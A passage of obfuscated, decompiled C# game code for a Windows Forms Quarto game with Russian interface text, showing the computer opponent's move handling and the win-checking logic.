						num3 = 1894770951;
						num7 = 1894770951;
					}
					continue;
				}
				case 6u:
					Paint_Board();
					num3 = ((int)num4 * -1586030752) ^ -1085483992;
					continue;
				case 4u:
					Form1.smethod_30((Control)(object)pictureBox1);
					num3 = (int)((num4 * 1011884308) ^ 0x39407C7);
					continue;
				case 3u:
					Form1.smethod_44(graphics_, Form1.smethod_21(pictureBox[num5, num6]), num * size + 4, num2 * size + 4, new Rectangle(0, 0, size, size), (GraphicsUnit)2);
					num3 = (int)(num4 * 338597808) ^ -1285356629;
					continue;
				case 2u:
					num3 = ((int)num4 * -139440434) ^ -501202849;
					continue;
				case 1u:
					num3 = (int)((num4 * 1303238341) ^ 0xBDAEE11);
					continue;
				case 0u:
					Form1.smethod_32((Control)(object)richTextBox1, "Уверены? Для выполнения данного хода нажмите \"Подтвердить\".");
					num3 = (int)((num4 * 637418344) ^ 0x3516CDAA);
					continue;
				default:
					return;
				case 5u:
					break;
				case 12u:
					return;
					IL_00e0:
					flag2 = (byte)num8 != 0;
					num3 = 1615777795;
					continue;
				}
				break;
			}
		}
	}

	private void Button2_Click(object sender, EventArgs e)
	{
		//IL_050b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0539: Expected O, but got Unknown
		Form1.smethod_7((Control)(object)button2, bool_0: false);
		int num44 = default(int);
		int num12 = default(int);
		Graphics graphics_ = default(Graphics);
		int num15 = default(int);
		int num16 = default(int);
		int num3 = default(int);
		int num4 = default(int);
		int num24 = default(int);
		bool flag7 = default(bool);
		int num13 = default(int);
		int num33 = default(int);
		bool flag2 = default(bool);
		bool flag11 = default(bool);
		int num17 = default(int);
		int num35 = default(int);
		int num19 = default(int);
		bool flag6 = default(bool);
		int num26 = default(int);
		int num7 = default(int);
		bool flag10 = default(bool);
		bool flag8 = default(bool);
		int num25 = default(int);
		bool flag5 = default(bool);
		int num8 = default(int);
		bool flag12 = default(bool);
		Figurine[,] array2 = default(Figurine[,]);
		bool flag3 = default(bool);
		bool flag4 = default(bool);
		int num18 = default(int);
		int num23 = default(int);
		bool flag13 = default(bool);
		Figurine[,] array = default(Figurine[,]);
		int num9 = default(int);
		bool flag9 = default(bool);
		Figurine[,] array3 = default(Figurine[,]);
		int num20 = default(int);
		int num31 = default(int);
		bool flag = default(bool);
		while (true)
		{
			int num = 631173133;
			while (true)
			{
				uint num2;
				int num27;
				int num59;
				int num28;
				int num50;
				switch ((num2 = (uint)num ^ 0x7698C277u) % 167u)
				{
				case 166u:
					Form1.smethod_47(1000);
					num = (int)(num2 * 1552971968) ^ -2094052960;
					continue;
				case 165u:
					num = (int)(num2 * 1325134160) ^ -1945269288;
					continue;
				case 164u:
					num44 = num12;
					num = (int)((num2 * 505923293) ^ 0x8B233C1);
					continue;
				case 163u:
					Form1.smethod_43(graphics_, Form1.smethod_42(Color.LimeGreen, 3f), ((float)num15 + 0.05f) * (float)size, ((float)num16 + 0.05f) * (float)size, (float)size * 0.9f, (float)size * 0.9f);
					num = (int)((num2 * 1582215697) ^ 0x3AC8120A);
					continue;
				case 162u:
					Form1.smethod_44(graphics_, Form1.smethod_21(pictureBox[num3, num4]), num15 * size + 4, num16 * size + 4, new Rectangle(0, 0, size, size), (GraphicsUnit)2);
					num = (int)((num2 * 1847884636) ^ 0x43641F1A);
					continue;
				case 161u:
					num24 = 0;
					num = 1782945936;
					continue;
				case 160u:
					num44 = 0;
					num = ((int)num2 * -783440192) ^ 0x31F20AA2;
					continue;
				case 159u:
					num = 1480394270;
					continue;
				case 158u:
					flag7 = num13 < 4;
					num = 645206500;
					continue;
				case 157u:
					num = 678451416;
					continue;
				case 156u:
					num = (int)(num2 * 1453238953) ^ -1329307725;
					continue;
				case 155u:
				{
					int num34;
					if (num33 < 4)
					{
						num = 861684226;
						num34 = 861684226;
					}
					else
					{
						num = 250552108;
						num34 = 250552108;
					}
					continue;
				}
				case 154u:
					flag2 = Standoff(board);
					num = 1003334303;
					continue;
				case 153u:
				{
					int num64;
					int num65;
					if (flag11)
					{
						num64 = 425928728;
						num65 = 425928728;
					}
					else
					{
						num64 = 1464836015;
						num65 = 1464836015;
					}
					num = num64 ^ ((int)num2 * -1922903123);
					continue;
				}
				case 152u:
					Form1.smethod_30((Control)(object)pictureBox[num3, num4]);
					num = ((int)num2 * -2133726131) ^ 0x7FCD3139;
					continue;
				case 151u:
					num = 235716025;
					continue;
				case 150u:
					num = 670786749;
					continue;
				case 149u:
					num = ((int)num2 * -733642006) ^ -1062615918;
					continue;
				case 148u:
					num = ((int)num2 * -1178026793) ^ 0x6D464C82;
					continue;
				case 147u:
					num17++;
					num = (int)((num2 * 1017276321) ^ 0x45287560);
					continue;
				case 146u:
					graphics_ = Form1.smethod_22(Form1.smethod_21(pictureBox1));
					num16 = 0;
					num = (int)(num2 * 213290121) ^ -536354415;
					continue;
				case 145u:
					storage[num35, num44] = null;
					Paint_Board();
					num = (int)(num2 * 1710736247) ^ -1133240461;
					continue;
				case 144u:
					num19 = 0;
					num = 177021627;
					continue;
				case 143u:
				{
					int num53;
					int num54;
					if (!flag6)
					{
						num53 = -1843726872;
						num54 = -1843726872;
					}
					else
					{
						num53 = -1479917326;
						num54 = -1479917326;
					}
					num = num53 ^ ((int)num2 * -2046270281);
					continue;
				}
				case 142u:
					if (num26 == num4)
					{
						goto IL_02d9;
					}
					goto IL_02e5;
				case 141u:
					step++;
					Form1.smethod_32((Control)(object)label2, Form1.smethod_34("Ход: ", step.ToString()));
					num = (int)((num2 * 1603512959) ^ 0x655575B1);
					continue;
				case 140u:
					num7 = Form1.smethod_33(rnd, 4);
					num = (int)(num2 * 2100133127) ^ -440942494;
					continue;
				case 139u:
					num = (int)(num2 * 1426349197) ^ -1184006952;
					continue;
				case 138u:
					flag10 = num12 < 4;
					num = 94486809;
					continue;
				case 137u:
					num = (int)(num2 * 1177394518) ^ -756820246;
					continue;
				case 136u:
				{
					int num42;
					int num43;
					if (flag8)
					{
						num42 = 201429927;
						num43 = 201429927;
					}
					else
					{
						num42 = 1657165827;
						num43 = 1657165827;
					}
					num = num42 ^ (int)(num2 * 1971134300);
					continue;
				}
				case 135u:
					num33 = 0;
					num = ((int)num2 * -744317539) ^ 0x6F4EA0D7;
					continue;
				case 134u:
					num = 1822250705;
					continue;
				case 133u:
					num = ((int)num2 * -1779443469) ^ 0x36B98B67;
					continue;
				case 132u:
					num12 = 0;
					num = 253191517;
					continue;
				case 131u:
					num12++;
					num = 253191517;
					continue;
				case 130u:
					flag8 = Form1.smethod_46((Control)(object)pictureBox1);
					num = (int)(num2 * 305283265) ^ -1368270013;
					continue;
				case 129u:
					Form1.smethod_30((Control)(object)pictureBox1);
					num = (int)(num2 * 1124263193) ^ -799623966;
					continue;
				case 128u:
					Form1.smethod_5((Control)(object)borderBox[num25, num26], Color.Blue);
					num = ((int)num2 * -1948015692) ^ -596541534;
					continue;
				case 127u:
					Form1.smethod_32((Control)(object)richTextBox1, "Ничья!");
					num = (int)(num2 * 291035221) ^ -212037571;
					continue;
				case 126u:
				{
					int num29;
					int num30;
					if (flag5)
					{
						num29 = -1169563991;
						num30 = -1169563991;
					}
					else
					{
						num29 = -1327187218;
						num30 = -1327187218;
					}
					num = num29 ^ (int)(num2 * 704907527);
					continue;
				}
				case 125u:
					num27 = ((num17 < 9) ? 1 : 0);
					goto IL_04c1;
				case 124u:
					Form1.smethod_32((Control)(object)richTextBox1, "QUARTO! Компьютер выиграл!");
					num = 577331384;
					continue;
				case 123u:
					num16++;
					num = (int)((num2 * 776224199) ^ 0x40C6B146);
					continue;
				case 122u:
				{
					int num14;
					if (Form1.smethod_40((Bitmap)Form1.smethod_21(pictureBox1), num12 * size + size / 2, (int)(((float)num13 + 0.05f) * (float)size)) == Color.FromArgb(255, 255, 0, 0))
					{
						num = 1359800022;
						num14 = 1359800022;
					}
					else
					{
						num = 1358235217;
						num14 = 1358235217;
					}
					continue;
				}
				case 121u:
					num17 = 0;
					num = ((int)num2 * -1107211327) ^ -477218083;
					continue;
				case 120u:
					num = (int)((num2 * 278609921) ^ 0x46660C34);
					continue;
				case 119u:
					num = ((int)num2 * -661657951) ^ 0x5E05E7AB;
					continue;
				case 118u:
					Form1.smethod_43(graphics_, Form1.smethod_42(Color.LimeGreen, 3f), ((float)num7 + 0.05f) * (float)size, ((float)num8 + 0.05f) * (float)size, (float)size * 0.9f, (float)size * 0.9f);
					Form1.smethod_44(graphics_, Form1.smethod_21(pictureBox[num3, num4]), num7 * size + 4, num8 * size + 4, new Rectangle(0, 0, size, size), (GraphicsUnit)2);
					num = (int)((num2 * 364294748) ^ 0x4253256D);
					continue;
				case 117u:
				{
					int num62;
					int num63;
					if (board[num8, num7] != null)
					{
						num62 = -1970869475;
						num63 = -1970869475;
					}
					else
					{
						num62 = -217877261;
						num63 = -217877261;
					}
					num = num62 ^ (int)(num2 * 343345256);
					continue;
				}
				case 116u:
					Form1.smethod_30((Control)(object)borderBox[num3, num4]);
					num = (int)(num2 * 1381330828) ^ -91383218;
					continue;
				case 115u:
					num = (int)((num2 * 460747842) ^ 0x580513CE);
					continue;
				case 114u:
					Form1.smethod_5((Control)(object)borderBox[num3, num4], Color.White);
					num = (int)(num2 * 990359576) ^ -1034628694;
					continue;
				case 113u:
					step++;
					num = (int)((num2 * 176986063) ^ 0xAE22CC2);
					continue;
				case 112u:
					num15 = 0;
					num = 560185456;
					continue;
				case 111u:
					Form1.smethod_15(timer1);
					(menu as Form3).ContinueLock();
					num = 1993891572;
					continue;
				case 110u:
				{
					int num60;
					int num61;
					if (!flag12)
					{
						num60 = 97485304;
						num61 = 97485304;
					}
					else
					{
						num60 = 1644533447;
						num61 = 1644533447;
					}
					num = num60 ^ (int)(num2 * 1945864056);
					continue;
				}
				case 109u:
					num = 601286155;
					continue;
				case 108u:
					if (!Standoff(array2))
					{
						num = 1892849005;
						num59 = 1892849005;
						continue;
					}
					goto IL_078e;
				case 107u:
					num = (int)((num2 * 1857225629) ^ 0x452A0545);
					continue;
				case 106u:
					flag3 = true;
					num = ((int)num2 * -1378958284) ^ 0x4225C882;
					continue;
				case 105u:
				{
					int num57;
					int num58;
					if (!flag4)
					{
						num57 = 1529732719;
						num58 = 1529732719;
					}
					else
					{
						num57 = 2057040402;
						num58 = 2057040402;
					}
					num = num57 ^ (int)(num2 * 1750257475);
					continue;
				}
				case 104u:
					num = ((int)num2 * -2085303918) ^ 0x491BD7B5;
					continue;
				case 103u:
					Form1.smethod_30((Control)(object)borderBox[num3, num4]);
					num = (int)((num2 * 1848692041) ^ 0xDF99882);
					continue;
				case 102u:
					num26 = Form1.smethod_33(rnd, 4);
					if (storage[num25, num26] != null)
					{
						num = (int)(num2 * 1642248673) ^ -143650276;
						continue;
					}
					goto IL_02d9;
				case 101u:
					num = ((int)num2 * -430603786) ^ -174428703;
					continue;
				case 100u:
					num18 = 0;
					num = (int)(num2 * 465825887) ^ -1265408340;
					continue;
				case 99u:
					num = 545041155;
					continue;
				case 98u:
					num = (int)(num2 * 669580690) ^ -1667682338;
					continue;
				case 97u:
					num = 1645108097;
					continue;
				case 96u:
					num13++;
					num = (int)((num2 * 1118612293) ^ 0x1EBCEB4C);
					continue;
				case 95u:
					num23 = 0;
					num = ((int)num2 * -1084126886) ^ 0x609D5F4D;
					continue;
				case 94u:
					flag3 = false;
					num = (int)(num2 * 180215933) ^ -730165166;
					continue;
				case 93u:
				{
					int num55;
					int num56;
					if (!flag13)
					{
						num55 = -949755024;
						num56 = -949755024;
					}
					else
					{
						num55 = -397852477;
						num56 = -397852477;
					}
					num = num55 ^ ((int)num2 * -298338222);
					continue;
				}
				case 92u:
					num28 = ((!Standoff(board)) ? 1 : 0);
					goto IL_092f;
				case 91u:
					Form1.smethod_32((Control)(object)label2, Form1.smethod_34("Ход: ", step.ToString()));
					num = ((int)num2 * -1769094769) ^ -1946772070;
					continue;
				case 90u:
					Form1.smethod_47(200);
					num = (int)((num2 * 1753935874) ^ 0x197E0B59);
					continue;
				case 89u:
					num = ((int)num2 * -2048318352) ^ -1480962233;
					continue;
				case 88u:
				{
					int num51;
					int num52;
					if (!flag10)
					{
						num51 = -152502165;
						num52 = -152502165;
					}
					else
					{
						num51 = -1601920844;
						num52 = -1601920844;
					}
					num = num51 ^ ((int)num2 * -1832961453);
					continue;
				}
				case 87u:
					num25 = Form1.smethod_33(rnd, 4);
					num = ((int)num2 * -465285070) ^ -621142367;
					continue;
				case 86u:
					num = ((int)num2 * -109751635) ^ -1350927375;
					continue;
				case 85u:
					Form1.smethod_32((Control)(object)richTextBox1, "Подождите, компьютер делает свой ход.");
					num = ((int)num2 * -794581368) ^ 0x303CE8A3;
					continue;
				case 84u:
					num = 1218738822;
					continue;
				case 83u:
					Form1.smethod_5((Control)(object)borderBox[num13, num12], Color.White);
					num = (int)(num2 * 883696294) ^ -1909395661;
					continue;
				case 82u:
					num = ((int)num2 * -189170300) ^ 0x2D60C1E;
					continue;
				case 81u:
					array2 = (Figurine[,])Form1.smethod_48((Array)board);
					num = ((int)num2 * -93046046) ^ -391599050;
					continue;
				case 80u:
					Form1.smethod_32((Control)(object)richTextBox1, "Выберете фигуру, которой будет играть противник.");
					num = ((int)num2 * -772736473) ^ -1184012824;
					continue;
				case 79u:
					array[num33, num9] = new Figurine(storage[num25, num26]);
					num = (int)((num2 * 1297134532) ^ 0x183040D2);
					continue;
				case 78u:
					flag12 = num15 < 4;
					num = 1228415404;
					continue;
				case 77u:
					flag9 = array3[num33, num9] == null;
					num = 1513973223;
					continue;
				case 76u:
					Form1.smethod_30((Control)(object)richTextBox1);
					num = (int)(num2 * 1874127765) ^ -1024506564;
					continue;
				case 75u:
					flag5 = num9 < 4;
					num = 1640165272;
					continue;
				case 74u:
					num3 = 0;
					num4 = 0;
					num = ((int)num2 * -101105165) ^ -502961523;
					continue;
				case 73u:
					num = (int)(num2 * 1424961607) ^ -116486123;
					continue;
				case 72u:
					num8 = Form1.smethod_33(rnd, 4);
					num = ((int)num2 * -1165348678) ^ 0xB960975;
					continue;
				case 71u:
					num = ((int)num2 * -436137703) ^ 0x2D496707;
					continue;
				case 70u:
					flag11 = num23 < 4;
					num = 1634405157;
					continue;
				case 69u:
				{
					int num49;
					if (board[num16, num15] == null)
					{
						num = 1138212376;
						num49 = 1138212376;
					}
					else
					{
						num = 601286155;
						num49 = 601286155;
					}
					continue;
				}
				case 68u:
					Form1.smethod_30((Control)(object)borderBox[num13, num12]);
					num = ((int)num2 * -1042993515) ^ 0x52653E8B;
					continue;
				case 67u:
					storage[num3, num4] = null;
					num = (int)((num2 * 1053759788) ^ 0x472B5BF9);
					continue;
				case 66u:
					num33++;
					num = ((int)num2 * -497189897) ^ 0x273270F1;
					continue;
				case 65u:
					num24++;
					num = ((int)num2 * -1890648660) ^ -1817478080;
					continue;
				case 64u:
					Form1.smethod_30((Control)(object)borderBox[num23, num24]);
					num = ((int)num2 * -999574643) ^ 0x174DD3AF;
					continue;
				case 63u:
					Form1.smethod_7((Control)(object)pictureBox1, bool_0: false);
					num = (int)(num2 * 837695394) ^ -1040568296;
					continue;
				case 62u:
				{
					int num48;
					if (num24 >= 4)
					{
						num = 834650213;
						num48 = 834650213;
					}
					else
					{
						num = 2001050911;
						num48 = 2001050911;
					}
					continue;
				}
				case 61u:
					num = ((int)num2 * -1080896110) ^ 0x7AB091FC;
					continue;
				case 60u:
					num = (int)(num2 * 1224032620) ^ -1212558370;
					continue;
				case 59u:
					if (num25 == num3)
					{
						num = ((int)num2 * -1433083906) ^ -684702914;
						continue;
					}
					goto IL_02e5;
				case 58u:
					num23++;
					num = ((int)num2 * -1340257297) ^ 0x244BCAD3;
					continue;
				case 57u:
					num = ((int)num2 * -535445687) ^ -330049619;
					continue;
				case 56u:
				{
					int num46;
					int num47;
					if (!flag9)
					{
						num46 = -13876952;
						num47 = -13876952;
					}
					else
					{
						num46 = -951061779;
						num47 = -951061779;
					}
					num = num46 ^ (int)(num2 * 1515222743);
					continue;
				}
				case 55u:
					num = ((int)num2 * -625467239) ^ -352647382;
					continue;
				case 54u:
				{
					int num45;
					if (num16 < 4)
					{
						num = 396757154;
						num45 = 396757154;
					}
					else
					{
						num = 1189634314;
						num45 = 1189634314;
					}
					continue;
				}
				case 53u:
					array3 = (Figurine[,])Form1.smethod_48((Array)board);
					array3[num8, num7] = new Figurine(storage[num3, num4]);
					num = (int)((num2 * 1083406052) ^ 0x362E1F9D);
					continue;
				case 52u:
					board[num20, num31] = new Figurine(storage[num35, num44]);
					num = (int)((num2 * 1498525846) ^ 0x1040BA4F);
					continue;
				case 51u:
					Form1.smethod_20(pictureBox[num3, num4], (Image)null);
					num = ((int)num2 * -352089051) ^ 0x142C5302;
					continue;
				case 50u:
				{
					int num40;
					int num41;
					if (Form1.smethod_41((Control)(object)borderBox[num13, num12]) == Color.Blue)
					{
						num40 = 1856667436;
						num41 = 1856667436;
					}
					else
					{
						num40 = 1106899962;
						num41 = 1106899962;
					}
					num = num40 ^ ((int)num2 * -354870340);
					continue;
				}
				case 49u:
					num = (int)(num2 * 1533050052) ^ -689005122;
					continue;
				case 48u:
					num = ((int)num2 * -2092226774) ^ -1059373316;
					continue;
				case 47u:
					array = (Figurine[,])Form1.smethod_48((Array)array3);
					num = (int)(num2 * 517559866) ^ -1984203120;
					continue;
				case 46u:
				{
					Form1.smethod_7((Control)(object)pictureBox[num23, num24], bool_0: false);
					int num38;
					int num39;
					if (!(Form1.smethod_41((Control)(object)borderBox[num23, num24]) == Color.Red))
					{
						num38 = 1862334067;
						num39 = 1862334067;
					}
					else
					{
						num38 = 873066885;
						num39 = 873066885;
					}
					num = num38 ^ (int)(num2 * 520897376);
					continue;
				}
				case 45u:
					Form1.smethod_32((Control)(object)richTextBox1, "Ничья!");
					num = ((int)num2 * -923968266) ^ -827241200;
					continue;
				case 44u:
					Form1.smethod_20(pictureBox[num13, num12], (Image)null);
					Form1.smethod_30((Control)(object)pictureBox[num13, num12]);
					num = ((int)num2 * -2074091699) ^ -1770705088;
					continue;
				case 43u:
					num = ((int)num2 * -158464035) ^ 0x17EBAEC4;
					continue;
				case 42u:
					num = 358050029;
					continue;
				case 41u:
					num = (int)(num2 * 1286374682) ^ -1246491719;
					continue;
				case 40u:
					Form1.smethod_20(pictureBox[num3, num4], (Image)null);
					Form1.smethod_30((Control)(object)pictureBox[num3, num4]);
					board[num8, num7] = new Figurine(storage[num3, num4]);
					num = ((int)num2 * -2031663653) ^ -833211537;
					continue;
				case 39u:
					Form1.smethod_15(timer1);
					num = (int)((num2 * 1253051478) ^ 0x44D43B8B);
					continue;
				case 38u:
					num20 = 0;
					num31 = 0;
					num13 = 0;
					num = (int)(num2 * 1937638492) ^ -915237938;
					continue;
				case 37u:
					num = ((int)num2 * -184017304) ^ -1233800103;
					continue;
				case 36u:
					num35 = 0;
					num = ((int)num2 * -567451) ^ 0x75F1FBCB;
					continue;
				case 35u:
				{
					int num36;
					int num37;
					if (!flag7)
					{
						num36 = -1067316698;
						num37 = -1067316698;
					}
					else
					{
						num36 = -1091869008;
						num37 = -1091869008;
					}
					num = num36 ^ (int)(num2 * 138950516);
					continue;
				}
				case 34u:
					Form1.smethod_47(200);
					Form1.smethod_5((Control)(object)borderBox[num3, num4], Color.White);
					num = ((int)num2 * -1185729999) ^ 0x483B5083;
					continue;
				case 33u:
					array2[num16, num15] = new Figurine(storage[num3, num4]);
					if (!Stop(array2))
					{
						num = ((int)num2 * -2112068776) ^ -353886274;
						continue;
					}
					goto IL_078e;
				case 32u:
					flag6 = num19 < 4;
					num = 415903458;
					continue;
				case 31u:
					num35 = num13;
					num = ((int)num2 * -786304239) ^ 0x9379B9D;
					continue;
				case 30u:
					num = (int)((num2 * 1380810819) ^ 0x4AE9DE3);
					continue;
				case 29u:
					num18++;
					num = ((int)num2 * -322832374) ^ 0x40AC29AC;
					continue;
				case 28u:
				{
					int num32;
					if (num18 < 4)
					{
						num = 558896789;
						num32 = 558896789;
					}
					else
					{
						num = 391384511;
						num32 = 391384511;
					}
					continue;
				}
				case 27u:
					flag = Standoff(board);
					num = ((int)num2 * -357060230) ^ -912757683;
					continue;
				case 26u:
					num31 = num12;
					num = ((int)num2 * -875054176) ^ 0x7472BAD1;
					continue;
				case 25u:
					if (!Stop(board))
					{
						num = (int)(num2 * 1402054814) ^ -839914534;
						continue;
					}
					num28 = 0;
					goto IL_092f;
				case 24u:
					num = (int)(num2 * 181105477) ^ -1209070537;
					continue;
				case 23u:
					Form1.smethod_5((Control)(object)borderBox[num23, num24], Color.LimeGreen);
					num = ((int)num2 * -673362461) ^ -1921130548;
					continue;
				case 21u:
					if (!flag3)
					{
						num = ((int)num2 * -317338167) ^ -417582191;
						continue;
					}
					num27 = 1;
					goto IL_04c1;
				case 20u:
					Form1.smethod_30((Control)(object)borderBox[num25, num26]);
					Form1.smethod_32((Control)(object)richTextBox1, "Противник сделал ход (зелёный). Выберете поле на доске для выбронной противником фигуры (синий).");
					Form1.smethod_7((Control)(object)pictureBox1, bool_0: true);
					num = (int)((num2 * 2069395170) ^ 0xAEA176B);
					continue;
				case 19u:
					num15++;
					num = 179401035;
					continue;
				case 18u:
					num = 822415517;
					continue;
				case 17u:
					(menu as Form3).ContinueLock();
					num = (int)(num2 * 717157403) ^ -1443207416;
					continue;
				case 16u:
					num3 = num23;
					num4 = num24;
					num = ((int)num2 * -1480701961) ^ -282949188;
					continue;
				case 15u:
					Form1.smethod_30((Control)(object)pictureBox1);
					num = ((int)num2 * -1915833154) ^ -1871640778;
					continue;
				case 14u:
				{
					int num21;
					int num22;
					if (!Stop(array))
					{
						num21 = 185945368;
						num22 = 185945368;
					}
					else
					{
						num21 = 420938900;
						num22 = 420938900;
					}
					num = num21 ^ (int)(num2 * 1594034894);
					continue;
				}
				case 13u:
					Form1.smethod_30((Control)(object)label2);
					num = (int)(num2 * 1430931471) ^ -1177007503;
					continue;
				case 12u:
					num20 = num13;
					num = ((int)num2 * -1547846326) ^ -1967956303;
					continue;
				case 11u:
					Form1.smethod_7((Control)(object)pictureBox[num18, num19], bool_0: true);
					num19++;
					num = 1368225622;
					continue;
				case 10u:
					board[num16, num15] = new Figurine(storage[num3, num4]);
					num = ((int)num2 * -1878241804) ^ 0x1571C41;
					continue;
				case 9u:
					num = ((int)num2 * -983606708) ^ 0x7A833A48;
					continue;
				case 8u:
				{
					int num10;
					int num11;
					if (flag2)
					{
						num10 = -1157911124;
						num11 = -1157911124;
					}
					else
					{
						num10 = -2018939092;
						num11 = -2018939092;
					}
					num = num10 ^ (int)(num2 * 1126269857);
					continue;
				}
				case 7u:
					num9++;
					num = 765339176;
					continue;
				case 6u:
					num9 = 0;
					num = 254216510;
					continue;
				case 5u:
					num = (int)((num2 * 1711181015) ^ 0x61784691);
					continue;
				case 4u:
					num = (int)(num2 * 628819914) ^ -1148708374;
					continue;
				case 3u:
				{
					int num5;
					int num6;
					if (!flag)
					{
						num5 = 1794963024;
						num6 = 1794963024;
					}
					else
					{
						num5 = 892214879;
						num6 = 892214879;
					}
					num = num5 ^ ((int)num2 * -296387044);
					continue;
				}
				case 2u:
					num = (int)((num2 * 121447370) ^ 0x2C6C2C2B);
					continue;
				case 1u:
					storage[num3, num4] = null;
					num = ((int)num2 * -2042122083) ^ 0x30291B34;
					continue;
				default:
					return;
				case 0u:
					break;
				case 22u:
					return;
					IL_04c1:
					flag4 = (byte)num27 != 0;
					num = 1889203537;
					continue;
					IL_02d9:
					num = 228474731;
					num50 = 228474731;
					continue;
					IL_02e5:
					num = 2082229542;
					num50 = 2082229542;
					continue;
					IL_092f:
					flag13 = (byte)num28 != 0;
					num = 795183223;
					continue;
					IL_078e:
					num = 399596003;
					num59 = 399596003;
					continue;
				}
				break;
			}
		}
	}

	private bool Stop(Figurine[,] mem)
	{
		bool flag = false;
		int num6 = default(int);
		bool result = default(bool);
		bool flag2 = default(bool);
		bool flag3 = default(bool);
		while (true)
		{
			int num = -827241595;
			while (true)
			{
				uint num2;
				int num36;
				int num39;
				switch ((num2 = (uint)num ^ 0xEBD4FC22u) % 77u)
				{
				case 76u:
					if (mem[2, 1] != null)
					{
						num = ((int)num2 * -1738560644) ^ 0x5A3AFEBC;
						continue;
					}
					goto IL_0024;
				case 75u:
					if (mem[3, num6] != null)
					{
						num = ((int)num2 * -201111667) ^ -293749541;
						continue;
					}
					goto IL_004e;
				case 74u:
				{
					int num21;
					int num22;
					if (mem[num6, 2] == null)
					{
						num21 = -2057380981;
						num22 = -2057380981;
					}
					else
					{
						num21 = -2115799646;
						num22 = -2115799646;
					}
					num = num21 ^ (int)(num2 * 1462293849);
					continue;
				}
				case 73u:
				{
					int num4;
					int num5;
					if (mem[0, 0].Big == mem[1, 1].Big)
					{
						num4 = -220544195;
						num5 = -220544195;
					}
					else
					{
						num4 = -479504708;
						num5 = -479504708;
					}
					num = num4 ^ ((int)num2 * -1939483014);
					continue;
				}
				case 72u:
					if (mem[1, 2] != null)
					{
						num = (int)(num2 * 96414947) ^ -1876096874;
						continue;
					}
					goto IL_0024;
				case 71u:
					if (mem[1, num6].Square == mem[2, num6].Square)
					{
						num = ((int)num2 * -1913023668) ^ 0x1443950E;
						continue;
					}
					goto IL_0119;
				case 70u:
				{
					int num25;
					int num26;
					if (mem[1, num6].Point != mem[2, num6].Point)
					{
						num25 = 1400782344;
						num26 = 1400782344;
					}
					else
					{
						num25 = 876076418;
						num26 = 876076418;
					}
					num = num25 ^ (int)(num2 * 687226472);
					continue;
				}
				case 69u:
				{
					int num62;
					int num63;
					if (mem[num6, 1] == null)
					{
						num62 = 1019861462;
						num63 = 1019861462;
					}
					else
					{
						num62 = 98045887;
						num63 = 98045887;
					}
					num = num62 ^ (int)(num2 * 833126593);
					continue;
				}
				case 68u:
					if (mem[2, 1].Point != mem[3, 0].Point)
					{
						num = (int)(num2 * 1325585162) ^ -65353788;
						continue;
					}
					goto IL_01be;
				case 67u:
					result = flag;
					num = -1323362737;
					continue;
				case 66u:
				{
					int num45;
					int num46;
					if (!flag2)
					{
						num45 = -1577847317;
						num46 = -1577847317;
					}
					else
					{
						num45 = -1842415636;
						num46 = -1842415636;
					}
					num = num45 ^ ((int)num2 * -1918172669);
					continue;
				}
				case 65u:
				{
					int num29;
					if (mem[0, 0].Point == mem[1, 1].Point)
					{
						num = -746900696;
						num29 = -746900696;
					}
					else
					{
						num = -1900513801;
						num29 = -1900513801;
					}
					continue;
				}
				case 64u:
				{
					int num7;
					int num8;
					if (mem[num6, 3] == null)
					{
						num7 = -1590550461;
						num8 = -1590550461;
					}
					else
					{
						num7 = -194459134;
						num8 = -194459134;
					}
					num = num7 ^ (int)(num2 * 1195568112);
					continue;
				}
				case 63u:
					if (mem[2, 1].Dark != mem[3, 0].Dark)
					{
						num = (int)(num2 * 1908359377) ^ -66719170;
						continue;
					}
					goto IL_01be;
				case 62u:
					if (mem[2, num6] != null)
					{
						num = (int)((num2 * 2058464880) ^ 0x7C315EAA);
						continue;
					}
					goto IL_004e;
				case 61u:
					if (mem[0, 3] != null)
					{
						num = -767054724;
						continue;
					}
					goto IL_0024;
				case 60u:
				{
					int num56;
					int num57;
					if (mem[0, 3].Big != mem[1, 2].Big)
					{
						num56 = -1536223130;
						num57 = -1536223130;
					}
					else
					{
						num56 = -1850171950;
						num57 = -1850171950;
					}
					num = num56 ^ (int)(num2 * 447049208);
					continue;
				}
				case 59u:
					if (mem[2, num6].Dark != mem[3, num6].Dark)
					{
						num = ((int)num2 * -494784985) ^ 0x23728B83;
						continue;
					}
					goto IL_0339;
				case 58u:
					if (mem[num6, 2].Big != mem[num6, 3].Big)
					{
						num = (int)((num2 * 911234201) ^ 0x7173A62);
						continue;
					}
					goto IL_036e;
				case 57u:
					if (mem[2, 2].Dark != mem[3, 3].Dark)
					{
						num = ((int)num2 * -1623644926) ^ -2040681608;
						continue;
					}
					goto IL_03a3;
				case 56u:
				{
					int num34;
					int num35;
					if (mem[num6, 1].Big != mem[num6, 2].Big)
					{
						num34 = 589105277;
						num35 = 589105277;
					}
					else
					{
						num34 = 706108781;
						num35 = 706108781;
					}
					num = num34 ^ ((int)num2 * -321724385);
					continue;
				}
				case 55u:
				{
					int num23;
					int num24;
					if (mem[1, 2].Point != mem[2, 1].Point)
					{
						num23 = 590576590;
						num24 = 590576590;
					}
					else
					{
						num23 = 85198647;
						num24 = 85198647;
					}
					num = num23 ^ (int)(num2 * 2133990027);
					continue;
				}
				case 54u:
				{
					int num15;
					int num16;
					if (mem[num6, 1].Dark != mem[num6, 2].Dark)
					{
						num15 = 853206107;
						num16 = 853206107;
					}
					else
					{
						num15 = 1367308676;
						num16 = 1367308676;
					}
					num = num15 ^ (int)(num2 * 1190595114);
					continue;
				}
				case 53u:
				{
					int num10;
					int num11;
					if (mem[num6, 0].Big != mem[num6, 1].Big)
					{
						num10 = -1703079140;
						num11 = -1703079140;
					}
					else
					{
						num10 = -1950881699;
						num11 = -1950881699;
					}
					num = num10 ^ (int)(num2 * 175376720);
					continue;
				}
				case 52u:
				{
					int num67;
					int num68;
					if (mem[1, 1].Big != mem[2, 2].Big)
					{
						num67 = -1142350714;
						num68 = -1142350714;
					}
					else
					{
						num67 = -70516239;
						num68 = -70516239;
					}
					num = num67 ^ (int)(num2 * 19540562);
					continue;
				}
				case 51u:
					if (mem[2, 1].Big != mem[3, 0].Big)
					{
						num = ((int)num2 * -1714133808) ^ -1878945482;
						continue;
					}
					goto IL_01be;
				case 49u:
					num6++;
					num = ((int)num2 * -407057606) ^ 0x4331D106;
					continue;
				case 48u:
				{
					int num58;
					int num59;
					if (mem[1, num6].Big == mem[2, num6].Big)
					{
						num58 = -1269737348;
						num59 = -1269737348;
					}
					else
					{
						num58 = -1548046745;
						num59 = -1548046745;
					}
